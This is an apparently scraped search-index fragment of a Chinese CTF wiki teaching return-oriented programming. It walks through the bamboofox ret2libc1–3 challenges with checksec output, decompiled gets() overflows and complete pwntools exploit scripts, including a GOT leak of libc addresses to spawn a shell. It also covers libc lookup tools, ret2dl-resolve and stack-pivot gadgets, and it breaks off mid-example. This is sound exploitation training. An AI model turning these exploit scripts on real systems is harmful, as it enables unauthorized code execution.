            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5bamboofox\u4e2dret2libc1\u4e3a\u4f8b    \u70b9\u51fb\u4e0b\u8f7d:  ret2libc1  \u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u68c0\u67e5\u4e00\u4e0b\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4  \u279c  ret2libc1 checksec ret2libc1    \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u6e90\u7a0b\u5e8f\u4e3a32\u4f4d\uff0c\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u7a0b\u5e8f\u6e90\u4ee3\u7801\uff0c\u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e  int   __cdecl   main ( int   argc ,   const   char   ** argv ,   const   char   ** envp )  { \n   int   v4 ;   // [sp+1Ch] [bp-64h]@1 \n\n   setvbuf ( stdout ,   0 ,   2 ,   0 ); \n   setvbuf ( _bss_start ,   0 ,   1 ,   0 ); \n   puts ( RET2LIBC  _ ); \n   gets (( char   * ) v4 ); \n   return   0 ;  }   \u53ef\u4ee5\u770b\u5230\u5728\u6267\u884cgets\u51fd\u6570\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u6808\u6ea2\u51fa\u3002\u6b64\u5916\uff0c\u5229\u7528ropgadget\uff0c\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u662f\u5426\u6709/bin/sh\u5b58\u5728  \u279c  ret2libc1 ROPgadget --binary ret2libc1 --string  /bin/sh           \nStrings  information  ============================================================ \n0x08048720 : /bin/sh  \u786e\u5b9e\u5b58\u5728\uff0c\u518d\u6b21\u67e5\u627e\u4e00\u4e0b\u662f\u5426\u6709system\u51fd\u6570\u5b58\u5728\u3002\u7ecf\u5728ida\u4e2d\u67e5\u627e\uff0c\u786e\u5b9e\u4e5f\u5b58\u5728\u3002  .plt: 08048460   ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]   \u90a3\u4e48\uff0c\u6211\u4eec\u76f4\u63a5\u8fd4\u56de\u8be5\u5904\uff0c\u5373\u6267\u884csystem\u51fd\u6570\u3002\u76f8\u5e94\u7684payload\u5982\u4e0b  ##!/usr/bin/env python  from   pwn   import   *  sh   =   process ( ./ret2libc1 )  binsh_addr   =   0x8048720  system_plt   =   0x08048460  payload   =   flat ([ a   *   112 ,   system_plt ,   b   *   4 ,   binsh_addr ])  sh . sendline ( payload )  sh . interactive ()   \u8fd9\u91cc\u6211\u4eec\u9700\u8981\u6ce8\u610f\u51fd\u6570\u8c03\u7528\u6808\u7684\u7ed3\u6784\uff0c\u5982\u679c\u662f\u6b63\u5e38\u8c03\u7528system\u51fd\u6570\uff0c\u6211\u4eec\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u8fd4\u56de\u5730\u5740\uff0c\u8fd9\u91cc\u4ee5'bbbb'\u4f5c\u4e3a\u865a\u5047\u7684\u5730\u5740\uff0c\u5176\u540e\u53c2\u6570\u5bf9\u5e94\u7684\u53c2\u6570\u5185\u5bb9\u3002  \u8fd9\u4e2a\u4f8b\u5b50\uff0c\u76f8\u5bf9\u6765\u8bf4\uff0c\u6700\u4e3a\u7b80\u5355\uff0c\u540c\u65f6\u63d0\u4f9b\u4e86system\u5730\u5740\u4e0e/bin/sh\u7684\u5730\u5740\uff0c\u4f46\u662f\u5927\u591a\u6570\u7a0b\u5e8f\u5e76\u4e0d\u4f1a\u6709\u8fd9\u4e48\u597d\u7684\u60c5\u51b5\u3002", 
            "title": "\u4f8b1"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#2", 
            "text": "\u8fd9\u91cc\u4ee5bamboofox\u4e2d\u7684ret2libc2\u4e3a\u4f8b    \u70b9\u51fb\u4e0b\u8f7d:  ret2libc2  \u8be5\u9898\u76ee\u4e0e\u4f8b1\u57fa\u672c\u4e00\u81f4\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u518d\u51fa\u73b0/bin/sh\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6b64\u6b21\u9700\u8981\u6211\u4eec\u81ea\u5df1\u6765\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e24\u4e2agadgets\uff0c\u7b2c\u4e00\u4e2a\u63a7\u5236\u7a0b\u5e8f\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u4e2a\u63a7\u5236\u7a0b\u5e8f\u6267\u884csystem(\"\"/bin/sh\")\u3002\u7531\u4e8e\u6f0f\u6d1e\u4e0e\u4e0a\u8ff0\u4e00\u81f4\uff0c\u8fd9\u91cc\u5c31\u4e0d\u5728\u591a\u8bf4\uff0c\u5177\u4f53\u7684exp\u5982\u4e0b  ##!/usr/bin/env python  from   pwn   import   *  sh   =   process ( ./ret2libc2 )  gets_plt   =   0x08048460  system_plt   =   0x08048490  pop_ebx   =   0x0804843d  buf2   =   0x804a080  payload   =   flat ( \n     [ a   *   112 ,   gets_plt ,   pop_ebx ,   buf2 ,   system_plt ,   0xdeadbeef ,   buf2 ])  sh . sendline ( payload )  sh . sendline ( /bin/sh )  sh . interactive ()   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u8fd9\u91cc\u5411\u7a0b\u5e8f\u4e2dbss\u6bb5\u7684buf2\u5904\u5199\u5165/bin/sh\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u5176\u5730\u5740\u4f5c\u4e3asystem\u7684\u53c2\u6570\u4f20\u5165\u3002\u8fd9\u6837\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u83b7\u5f97shell\u3002", 
            "title": "\u4f8b2"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#3", 
            "text": "\u8fd9\u91cc\u4ee5bamboofox\u4e2d\u7684ret2libc3\u4e3a\u4f8b    \u70b9\u51fb\u4e0b\u8f7d:  ret2libc3  \u5728\u4f8b2\u7684\u57fa\u7840\u4e0a\uff0c\u518d\u6b21\u5c06system\u51fd\u6570\u7684\u5730\u5740\u53bb\u6389\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u9700\u8981\u540c\u65f6\u627e\u5230system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u9996\u5148\uff0c\u67e5\u770b\u5b89\u5168\u4fdd\u62a4  \u279c  ret2libc3 checksec ret2libc3\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u4ecd\u65e7\u5f00\u542f\u4e86\u5806\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\u8fdb\u800c\u67e5\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u7a0b\u5e8f\u7684bug\u4ecd\u7136\u662f\u6808\u6ea2\u51fa  int   __cdecl   main ( int   argc ,   const   char   ** argv ,   const   char   ** envp )  { \n   int   v4 ;   // [sp+1Ch] [bp-64h]@1 \n\n   setvbuf ( stdout ,   0 ,   2 ,   0 ); \n   setvbuf ( stdin ,   0 ,   1 ,   0 ); \n   puts ( No surprise anymore, system disappeard QQ. ); \n   printf ( Can you find it !? ); \n   gets (( char   * ) v4 ); \n   return   0 ;  }   \u90a3\u4e48\u6211\u4eec\u5982\u4f55\u5f97\u5230system\u51fd\u6570\u7684\u5730\u5740\u5462\uff1f\u8fd9\u91cc\u5c31\u4e3b\u8981\u5229\u7528\u4e86\u4e24\u4e2a\u77e5\u8bc6\u70b9   system\u51fd\u6570\u5c5e\u4e8elibc\uff0c\u800clibc.so\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\u4e4b\u95f4\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684\u3002  \u5373\u4f7f\u7a0b\u5e8f\u6709ASLR\u4fdd\u62a4\uff0c\u4e5f\u53ea\u662f\u9488\u5bf9\u4e8e\u5730\u5740\u4e2d\u95f4\u4f4d\u8fdb\u884c\u968f\u673a\uff0c\u6700\u4f4e\u768412\u4f4d\u5e76\u4e0d\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u800clibc\u5728github\u4e0a\u6709\u4eba\u8fdb\u884c\u6536\u96c6\uff0c\u5177\u4f53\u7ec6\u8282\u5982\u4e0b  https://github.com/niklasb/libc-database   \u6240\u4ee5\u5982\u679c\u6211\u4eec\u77e5\u9053libc\u4e2d\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u786e\u5b9a\u8be5\u7a0b\u5e8f\u5229\u7528\u7684libc\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u77e5\u9053system\u51fd\u6570\u7684\u5730\u5740\u3002  \u90a3\u4e48\u5982\u4f55\u5f97\u5230libc\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\u5462\uff1f\u6211\u4eec\u4e00\u822c\u5e38\u7528\u7684\u65b9\u6cd5\u662f\u91c7\u7528got\u8868\u6cc4\u9732\uff0c\u5373\u8f93\u51fa\u67d0\u4e2a\u51fd\u6570\u5bf9\u5e94\u7684got\u8868\u9879\u7684\u5185\u5bb9\u3002 \u5f53\u7136\uff0c\u7531\u4e8elibc\u7684\u5ef6\u8fdf\u7ed1\u5b9a\u673a\u5236\uff0c\u6211\u4eec\u9700\u8981\u9009\u62e9\u5df2\u7ecf\u6267\u884c\u8fc7\u7684\u51fd\u6570\u6765\u8fdb\u884c\u6cc4\u9732\u3002  \u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u6b65\u9aa4\u5148\u5f97\u5230libc\uff0c\u4e4b\u540e\u5728\u7a0b\u5e8f\u4e2d\u67e5\u8be2\u504f\u79fb\uff0c\u7136\u540e\u518d\u6b21\u83b7\u53d6system\u5730\u5740\uff0c\u4f46\u8fd9\u6837\u624b\u5de5\u64cd\u4f5c\u6b21\u6570\u592a\u591a\uff0c\u6709\u70b9\u9ebb\u70e6\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2alibc\u7684\u5229\u7528\u5de5\u5177\uff0c\u5177\u4f53\u7ec6\u8282\u8bf7\u53c2\u8003readme   https://github.com/lieanu/LibcSearcher   \u6b64\u5916\uff0c\u5728\u5f97\u5230libc\u4e4b\u540e\uff0c\u5176\u5b9elibc\u4e2d\u4e5f\u662f\u6709/bin/sh\u5b57\u7b26\u4e32\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4e00\u8d77\u83b7\u5f97/bin/sh\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002  \u8fd9\u91cc\u6211\u4eec\u6cc4\u9732__libc_start_main\u7684\u5730\u5740\uff0c\u8fd9\u662f\u56e0\u4e3a\u5b83\u662f\u7a0b\u5e8f\u6700\u521d\u88ab\u6267\u884c\u7684\u5730\u65b9\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u6cc4\u9732__libc_start_main\u5730\u5740  \u83b7\u53d6libc\u7248\u672c  \u83b7\u53d6system\u5730\u5740\u4e0e/bin/sh\u7684\u5730\u5740  \u518d\u6b21\u6267\u884c\u6e90\u7a0b\u5e8f  \u89e6\u53d1\u6808\u6ea2\u51fa\u6267\u884csystem(\u2018/bin/sh\u2019)   exp\u5982\u4e0b  ##!/usr/bin/env python  from   pwn   import   *  from   LibcSearcher   import   LibcSearcher  sh   =   process ( ./ret2libc3 )  ret2libc3   =   ELF ( ./ret2libc3 )  puts_plt   =   ret2libc3 . plt [ puts ]  libc_start_main_got   =   ret2libc3 . got [ __libc_start_main ]  main   =   ret2libc3 . symbols [ main ]  print   leak libc_start_main_got addr and return to main again  payload   =   flat ([ A   *   112 ,   puts_plt ,   main ,   libc_start_main_got ])  sh . sendlineafter ( Can you find it !? ,   payload )  print   get the related addr  libc_start_main_addr   =   u32 ( sh . recv ()[ 0 : 4 ])  libc   =   LibcSearcher ( __libc_start_main ,   libc_start_main_addr )  libcbase   =   libc_start_main_addr   -   libc . dump ( __libc_start_main )  system_addr   =   libcbase   +   libc . dump ( system )  binsh_addr   =   libcbase   +   libc . dump ( str_bin_sh )  print   get shell  payload   =   flat ([ A   *   104 ,   system_addr ,   0xdeadbeef ,   binsh_addr ])  sh . sendline ( payload )  sh . interactive ()", 
            "title": "\u4f8b3"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_12", 
            "text": "train.cs.nctu.edu.tw ret2libc", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#shell", 
            "text": "\u8fd9\u91cc\u603b\u7ed3\u51e0\u79cd\u5e38\u89c1\u7684\u83b7\u53d6shell\u7684\u65b9\u5f0f\uff1a   \u6267\u884cshellcode\uff0c\u8fd9\u4e00\u65b9\u9762\u4e5f\u4f1a\u6709\u4e0d\u540c\u7684\u60c5\u51b5  \u53ef\u4ee5\u76f4\u63a5\u8fd4\u56deshell  \u53ef\u4ee5\u5c06shell\u8fd4\u56de\u5230\u67d0\u4e00\u4e2a\u7aef\u53e3  shellcode\u4e2d\u5b57\u7b26\u6709\u65f6\u5019\u9700\u8981\u6ee1\u8db3\u4e0d\u540c\u7684\u9700\u6c42  \u6ce8\u610f\uff0c\u6211\u4eec\u9700\u8981\u5c06shellcode\u5199\u5728\u53ef\u4ee5\u6267\u884c\u7684\u5185\u5b58\u533a\u57df\u4e2d\u3002    \u6267\u884c system(\"/bin/sh\"), system('sh') \u7b49\u7b49  \u5173\u4e8e system \u7684\u5730\u5740\uff0c\u53c2\u89c1\u4e0b\u9762\u7ae0\u8282\u7684 \u5730\u5740\u5bfb\u627e \u3002  \u5173\u4e8e \"/bin/sh\"\uff0c \u201csh\u201d  \u9996\u5148\u5bfb\u627e binary \u91cc\u9762\u6709\u6ca1\u6709\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c \u6bd4\u5982\u8bf4\u6709 flush \u51fd\u6570\uff0c\u90a3\u5c31\u4e00\u5b9a\u6709 sh \u4e86  \u8003\u8651\u4e2a\u4eba\u8bfb\u53d6\u5bf9\u5e94\u5b57\u7b26\u4e32  libc \u4e2d\u5176\u5b9e\u662f\u6709 /bin/sh \u7684    \u4f18\u70b9  \u53ea\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u3002    \u7f3a\u70b9  \u6709\u53ef\u80fd\u56e0\u4e3a\u7834\u574f\u73af\u5883\u53d8\u91cf\u800c\u65e0\u6cd5\u6267\u884c\u3002      \u6267\u884c execve(\"/bin/sh\",NULL,NULL)  \u524d\u51e0\u6761\u540c system  \u4f18\u70b9  \u51e0\u4e4e\u4e0d\u53d7\u73af\u5883\u53d8\u91cf\u7684\u5f71\u54cd\u3002    \u7f3a\u70b9  \u9700\u8981 3 \u4e2a\u53c2\u6570\u3002      \u7cfb\u7edf\u8c03\u7528  \u7cfb\u7edf\u8c03\u7528\u53f7 __NR_execve \u5728IA-32\u4e2d\u4e3a11\uff0cx86-64\u4e3a59", 
            "title": "shell\u83b7\u53d6\u5c0f\u7ed3"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_13", 
            "text": "\u5728\u6574\u4e2a\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u603b\u662f\u514d\u4e0d\u4e86\u8981\u53bb\u5bfb\u627e\u4e00\u4e9b\u5730\u5740\uff0c\u5e38\u89c1\u7684\u5bfb\u627e\u5730\u5740\u7684\u7c7b\u578b\uff0c\u6709\u5982\u4e0b\u51e0\u79cd", 
            "title": "\u5730\u5740\u5bfb\u627e\u5c0f\u7ed3"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_14", 
            "text": "", 
            "title": "\u901a\u7528\u5bfb\u627e"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_15", 
            "text": "\u7a0b\u5e8f\u4e2d\u5df2\u7ecf\u7ed9\u51fa\u4e86\u76f8\u5173\u53d8\u91cf\u6216\u8005\u51fd\u6570\u7684\u5730\u5740\u4e86\u3002\u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5229\u7528\u4e86\u3002", 
            "title": "\u76f4\u63a5\u5730\u5740\u5bfb\u627e"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#got", 
            "text": "\u6709\u65f6\u5019\u6211\u4eec\u5e76\u4e0d\u4e00\u5b9a\u975e\u5f97\u76f4\u63a5\u77e5\u9053\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u5229\u7528GOT\u8868\u7684\u8df3\u8f6c\u5230\u5bf9\u5e94\u51fd\u6570\u7684\u5730\u5740\u3002\u5f53\u7136\uff0c\u5982\u679c\u6211\u4eec\u975e\u5f97\u77e5\u9053\u8fd9\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528write\uff0cputs\u7b49\u8f93\u51fa\u51fd\u6570\u5c06GOT\u8868\u4e2d\u5730\u5740\u5904\u5bf9\u5e94\u7684\u5185\u5bb9\u8f93\u51fa\u51fa\u6765\uff08 \u524d\u63d0\u662f\u8fd9\u4e2a\u51fd\u6570\u5df2\u7ecf\u88ab\u89e3\u6790\u4e00\u6b21\u4e86 \uff09\u3002", 
            "title": "got\u8868\u5bfb\u627e"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#libc", 
            "text": "\u76f8\u5bf9\u504f\u79fb\u5bfb\u627e \uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u8003\u8651\u5229\u7528libc\u4e2d\u51fd\u6570\u7684\u57fa\u5730\u5740\u4e00\u6837\u8fd9\u4e2a\u7279\u6027\u6765\u5bfb\u627e\u4e86\u3002\u5176\u5b9e__libc_start_main\u5c31\u662flibc\u5728\u5185\u5b58\u4e2d\u7684\u57fa\u5730\u5740\u3002 \u6ce8\u610f\uff1a\u4e0d\u8981\u9009\u62e9\u6709wapper\u7684\u51fd\u6570\uff0c\u8fd9\u6837\u4f1a\u4f7f\u5f97\u51fd\u6570\u7684\u57fa\u5730\u5740\u8ba1\u7b97\u4e0d\u6b63\u786e\u3002 \u5e38\u89c1\u7684\u6709wapper\u7684\u51fd\u6570\u6709\uff08\u5f85\u8865\u5145\uff09\u3002", 
            "title": "\u6709libc"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#libc_1", 
            "text": "\u5176\u5b9e\uff0c\u8fd9\u79cd\u60c5\u51b5\u7684\u89e3\u51b3\u7b56\u7565\u5206\u4e3a\u4e24\u79cd   \u60f3\u529e\u6cd5\u83b7\u53d6libc  \u60f3\u529e\u6cd5\u76f4\u63a5\u83b7\u53d6\u5bf9\u5e94\u7684\u5730\u5740\u3002   \u800c\u5bf9\u4e8e\u60f3\u8981\u6cc4\u9732\u7684\u5730\u5740\uff0c\u6211\u4eec\u53ea\u662f\u5355\u7eaf\u5730\u9700\u8981\u5176\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u6240\u4ee5puts\u548cwrite\u5747\u53ef\u4ee5\u3002   puts\u4f1a\u6709\\x00\u622a\u65ad\u7684\u95ee\u9898  write\u53ef\u4ee5\u6307\u5b9a\u957f\u5ea6\u8f93\u51fa\u7684\u5185\u5bb9\u3002   \u4e0b\u9762\u662f\u4e00\u4e9b\u76f8\u5e94\u7684\u65b9\u6cd5", 
            "title": "\u65e0libc"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#pwnlibdynelf", 
            "text": "\u524d\u63d0\u662f\u6211\u4eec\u53ef\u4ee5\u6cc4\u9732\u4efb\u610f\u5730\u5740\u7684\u5185\u5bb9\u3002   \u5982\u679c\u8981\u4f7f\u7528write\u51fd\u6570\u6cc4\u9732\u7684\u8bdd\uff0c\u4e00\u6b21\u6700\u597d\u591a\u8f93\u51fa\u4e00\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u822c\u662f\u53ea\u662f\u4e0d\u65ad\u5730\u5411\u9ad8\u5730\u5740\u8bfb\u5185\u5bb9\uff0c\u5f88\u6709\u53ef\u80fd\u5bfc\u81f4\u9ad8\u5730\u5740\u7684\u73af\u5883\u53d8\u91cf\u88ab\u8986\u76d6\uff0c\u5c31\u4f1a\u5bfc\u81f4shell\u4e0d\u80fd\u542f\u52a8\u3002", 
            "title": "pwnlib.dynelf"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#libc_2", 
            "text": "## \u66f4\u65b0\u6570\u636e\u5e93 \n./get ## \u5c06\u5df2\u6709libc\u6dfb\u52a0\u5230\u6570\u636e\u5e93\u4e2d \n./add libc.so  ## Find all the libc s in the database that have the given names at the given addresses.  \n./find function1 addr function2 addr ## Dump some useful offsets, given a libc ID. You can also provide your own names to dump. \n./dump __libc_start_main_ret system dup2  \u53bblibc\u7684\u6570\u636e\u5e93\u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u548c\u5df2\u7ecf\u51fa\u73b0\u7684\u5730\u5740\u4e00\u6837\u7684libc\uff0c\u8fd9\u65f6\u5019\u5f88\u6709\u53ef\u80fd\u662f\u4e00\u6837\u7684\u3002   libcdb.com   \u5f53\u7136\uff0c\u8fd8\u6709\u4e0a\u9762\u63d0\u5230\u7684https://github.com/lieanu/LibcSearcher\u3002", 
            "title": "libc\u6570\u636e\u5e93"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#ret2dl-resolve", 
            "text": "\u5f53ELF\u6587\u4ef6\u91c7\u7528\u52a8\u6001\u94fe\u63a5\u65f6\uff0cgot\u8868\u4f1a\u91c7\u7528\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\u3002\u5f53\u7b2c\u4e00\u6b21\u8c03\u7528\u67d0\u4e2alibc\u51fd\u6570\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8c03\u7528_dl_runtime_resolve\u51fd\u6570\u5bf9\u5176\u5730\u5740\u89e3\u6790\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u6784\u9020ROP\u94fe\uff0c\u4f2a\u9020\u5bf9\u5176\u4ed6\u51fd\u6570\uff08\u5982\uff1asystem\uff09\u7684\u89e3\u6790\u3002\u8fd9\u4e5f\u662f\u6211\u4eec\u5728\u9ad8\u7ea7rop\u4e2d\u4f1a\u4ecb\u7ecd\u7684\u6280\u5de7\u3002", 
            "title": "ret2dl-resolve"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_16", 
            "text": "train.cs.nctu.edu.tw  rop  2013-PlaidCTF-ropasaurusrex  Defcon 2015 Qualifier: R0pbaby   \u53c2\u8003\u9605\u8bfb   \u4e4c\u4e91\u4e00\u6b65\u4e00\u6b65ROP\u7bc7(\u84b8\u7c73)  \u624b\u628a\u624b\u6559\u4f60\u6808\u6ea2\u51fa\u4ece\u5165\u95e8\u5230\u653e\u5f03\uff08\u4e0a\uff09  \u624b\u628a\u624b\u6559\u4f60\u6808\u6ea2\u51fa\u4ece\u5165\u95e8\u5230\u653e\u5f03\uff08\u4e0b\uff09   \u3010\u6280\u672f\u5206\u4eab\u3011\u73b0\u4ee3\u6808\u6ea2\u51fa\u5229\u7528\u6280\u672f\u57fa\u7840\uff1aROP", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/others/", 
            "text": "\u82b1\u5f0f\u6808\u6ea2\u51fa\u6280\u5de7\n\n\nstack pivoting\n\n\n\u539f\u7406\n\n\nstack pivoting\uff0c\u6b63\u5982\u5b83\u6240\u63cf\u8ff0\u7684\uff0c\u8be5\u6280\u5de7\u5c31\u662f\u52ab\u6301\u6808\u6307\u9488\u6307\u5411\u653b\u51fb\u8005\u6240\u80fd\u63a7\u5236\u7684\u5185\u5b58\u5904\uff0c\u7136\u540e\u518d\u5728\u76f8\u5e94\u7684\u4f4d\u7f6e\u8fdb\u884cROP\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u5728\u4ee5\u4e0b\u60c5\u51b5\u9700\u8981\u4f7f\u7528stack pivoting\n\n\n\n\n\u53ef\u4ee5\u63a7\u5236\u7684\u6808\u6ea2\u51fa\u7684\u5b57\u8282\u6570\u8f83\u5c11\uff0c\u96be\u4ee5\u6784\u9020\u8f83\u957f\u7684ROP\u94fe\n\n\n\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u6808\u5730\u5740\u672a\u77e5\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6808\u52ab\u6301\u5230\u5df2\u77e5\u7684\u533a\u57df\u3002\n\n\n\u5176\u5b83\u6f0f\u6d1e\u96be\u4ee5\u5229\u7528\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8f6c\u6362\uff0c\u6bd4\u5982\u8bf4\u5c06\u6808\u52ab\u6301\u5230\u5806\u7a7a\u95f4\uff0c\u4ece\u800c\u5229\u7528\u5806\u6f0f\u6d1e\n\n\n\n\n\u6b64\u5916\uff0c\u5229\u7528stack pivoting\u6709\u4ee5\u4e0b\u51e0\u4e2a\u8981\u6c42\n\n\n\n\n\n\n\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002\n\n\n\n\n\n\n\u53ef\u4ee5\u63a7\u5236sp\u6307\u9488\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u63a7\u5236\u6808\u6307\u9488\u4f1a\u4f7f\u7528ROP\uff0c\u5e38\u89c1\u7684\u63a7\u5236\u6808\u6307\u9488\u7684gadgets\u4e00\u822c\u662f\n\n\n\n\n\n\npop\n \nrsp\n/\nesp\n\n\n\n\n\n\u5f53\u7136\uff0c\u8fd8\u4f1a\u6709\u4e00\u4e9b\u5176\u5b83\u7684\u59ff\u52bf\u3002\u6bd4\u5982\u8bf4libc_csu_init\u4e2d\u7684gadgets\uff0c\u6211\u4eec\u901a\u8fc7\u504f\u79fb\u5c31\u53ef\u4ee5\u5f97\u5230\u63a7\u5236rsp\u6307\u9488\u3002\u4e0a\u9762\u7684\u662f\u6b63\u5e38\u7684\uff0c\u4e0b\u9762\u7684\u662f\u504f\u79fb\u7684\u3002\n\n\ngef\n\u27a4\n  \nx\n/\n7\ni\n \n0x000000000040061a\n\n\n0\nx40061a\n \n__libc_csu_init\n+\n90\n:\n  \npop\n    \nrbx\n\n\n0\nx40061b\n \n__libc_csu_init\n+\n91\n:\n  \npop\n    \nrbp\n\n\n0\nx40061c\n \n__libc_csu_init\n+\n92\n:\n  \npop\n    \nr12\n\n\n0\nx40061e\n \n__libc_csu_init\n+\n94\n:\n  \npop\n    \nr13\n\n\n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n  \npop\n    \nr14\n\n\n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n  \npop\n    \nr15\n\n\n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n \nret\n    \n\ngef\n\u27a4\n  \nx\n/\n7\ni\n \n0x000000000040061d\n\n\n0\nx40061d\n \n__libc_csu_init\n+\n93\n:\n  \npop\n    \nrsp\n\n\n0\nx40061e\n \n__libc_csu_init\n+\n94\n:\n  \npop\n    \nr13\n\n\n0\nx400620\n \n__libc_csu_init\n+\n96\n:\n  \npop\n    \nr14\n\n\n0\nx400622\n \n__libc_csu_init\n+\n98\n:\n  \npop\n    \nr15\n\n\n0\nx400624\n \n__libc_csu_init\n+\n100\n:\n \nret\n\n\n\n\n\n\u6b64\u5916\uff0c\u8fd8\u6709\u66f4\u52a0\u9ad8\u7ea7\u7684fake frame\u3002\n\n\n\n\n\u5b58\u5728\u53ef\u4ee5\u63a7\u5236\u5185\u5bb9\u7684\u5185\u5b58\uff0c\u4e00\u822c\u6709\u5982\u4e0b\n\n\nbss\u6bb5\u3002\u7531\u4e8e\u8fdb\u7a0b\u6309\u9875\u5206\u914d\u5185\u5b58\uff0c\u5206\u914d\u7ed9bss\u6bb5\u7684\u5185\u5b58\u5927\u5c0f\u81f3\u5c11\u4e00\u4e2a\u9875(4k,0x1000)\u5927\u5c0f\u3002\u7136\u800c\u4e00\u822cbss\u6bb5\u7684\u5185\u5bb9\u7528\u4e0d\u4e86\u8fd9\u4e48\u591a\u7684\u7a7a\u95f4\uff0c\u5e76\u4e14bss\u6bb5\u5206\u914d\u7684\u5185\u5b58\u9875\u62e5\u6709\u8bfb\u5199\u6743\u9650\u3002\n\n\nheap\u3002\u4f46\u662f\u8fd9\u4e2a\u9700\u8981\u6211\u4eec\u80fd\u591f\u6cc4\u9732\u5806\u5730\u5740\u3002\n\n\n\n\n\u793a\u4f8b\n\n\n\u4f8b1\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5\nX-CTF Quals 2016 - b0verfl0w\n\u4e3a\u4f8b\uff0c\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\uff0c\u67e5\u770b\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4\uff0c\u5982\u4e0b\n\n\n\u279c  X-CTF Quals \n2016\n - b0verfl0w git:\n(\niromise\n)\n \u2717 checksec b0verfl0w                 \n    Arch:     i386-32-little\n    